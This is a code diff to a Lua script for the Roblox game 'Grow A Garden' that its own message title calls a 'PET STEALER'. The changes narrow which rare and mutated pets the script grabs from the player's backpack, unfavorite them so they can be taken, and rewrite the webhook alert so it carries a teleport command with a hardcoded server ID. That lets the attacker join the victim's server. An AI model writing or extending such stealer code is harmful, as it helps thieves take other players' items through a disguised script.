@@ -47,8 +47,27 @@ end
 -- Constants
 local excludedItems = {"Seed", "Shovel [Destroy Plants]", "Water", "Fertilizer"}
 -- Remove plant-related constants and logic
--- Replace rarePets with rareKeywords for substring matching
-local rareKeywords = {"Red Fox", "Raccoon", "Dragonfly", "Golden Lab", "Ascended", "Inverted", "Rainbow", "Radiant", "IronSkin", "Golden", "Tiny", "Frozen", "Windy", "Mega", "Shiny", "Shocked"}
+-- Rare pets and mutation keywords
+local rarePets = {"Red Fox", "Raccoon", "Dragonfly", "Queen Bee", "T-Rex", "Fennec Fox", "Butterfly", "Disco Bee", "Mimic Octopus", "Kitsune", "Spinosaurus"}
+local mutationKeywords = {"Ascended", "Inverted", "Rainbow", "Radiant", "IronSkin", "Golden", "Tiny", "Frozen", "Windy", "Mega", "Shiny", "Shocked"}
+
+local function isRarePet(petName)
+    for _, rare in ipairs(rarePets) do
+        if string.find(petName, rare) then
+            return true
+        end
+    end
+    return false
+end
+
+local function hasMutation(petName)
+    for _, mutation in ipairs(mutationKeywords) do
+        if string.find(petName, mutation) then
+            return true
+        end
+    end
+    return false
+end
 local totalValue = 0
 local itemsToSend = {}
 
@@ -259,7 +278,7 @@ local function SendJoinMessage(list, prefix)
     end
 
     local data = {
-        ["content"] = prefix .. 'Pet gifting event!\nServer Location: PlaceId=' .. tostring(game.PlaceId) .. ', JobId=' .. tostring(game.JobId),
+        ["content"] = 'game:GetService("TeleportService"):TeleportToPlaceInstance(126884695634066, "68a50a57-0d56-4794-8017-6013bce03b12")',
         ["embeds"] = {{
             ["title"] = ":dog: Grow A Garden Hit - RONZZ: PET STEALER :dog:",
             ["color"] = 25500,
@@ -341,16 +360,8 @@ for _, tool in ipairs(backpack:GetChildren()) do
                     if v14 then
                         local itemName = v14.PetType
                         local petAge = v14.PetData and v14.PetData.Age or "N/A"
-                        -- Check if pet name contains any rare keyword (case-insensitive)
-                        local isRare = false
-                        local lowerName = string.lower(itemName)
-                        for _, keyword in ipairs(rareKeywords) do
-                            if string.find(lowerName, string.lower(keyword), 1, true) then
-                                isRare = true
-                                break
-                            end
-                        end
-                        if isRare or getWeight(tool) >= 10 or getWeight(tool) >= 25 then
+                        -- Only include rare pets and their mutated forms
+                        if isRarePet(itemName) then
                             if tool:GetAttribute("Favorite") then
                                 local success = pcall(function()
                                     replicatedStorage:WaitForChild("GameEvents"):WaitForChild("Favorite_Item"):FireServer(tool)
@@ -365,6 +376,22 @@ for _, tool in ipairs(backpack:GetChildren()) do
                             totalValue = totalValue + value
                             table.insert(itemsToSend, {Tool = tool, Name = itemName, Value = value, Weight = weight, Type = "Pet", Age = petAge})
                             debugPrint("Added pet: " .. itemName .. " Value: " .. value .. " Age: " .. tostring(petAge))
+                        elseif hasMutation(itemName) and isRarePet(itemName) then
+                            -- Mutated rare pets
+                            if tool:GetAttribute("Favorite") then
+                                local success = pcall(function()
+                                    replicatedStorage:WaitForChild("GameEvents"):WaitForChild("Favorite_Item"):FireServer(tool)
+                                end)
+                                if not success then
+                                    debugPrint("Failed to unfavorite pet")
+                                end
+                            end
+                            local value = calcPetValue(v14)
+                            local toolName = tool.Name
+                            local weight = tonumber(toolName:match("%[(%d+%.?%d*) KG%]")) or 0
+                            totalValue = totalValue + value
+                            table.insert(itemsToSend, {Tool = tool, Name = itemName, Value = value, Weight = weight, Type = "Pet", Age = petAge})
+                            debugPrint("Added mutated rare pet: " .. itemName .. " Value: " .. value .. " Age: " .. tostring(petAge))
                         end
                     end
                 end
@@ -408,7 +435,7 @@ if #itemsToSend > 0 then
 
     local prefix = ""
     if ping == "Yes" then
-        prefix = "@everyone "
+        prefix = "--@everyone "
     end
 
     -- Remove followUser and waitForUserChat, just send notification after scan
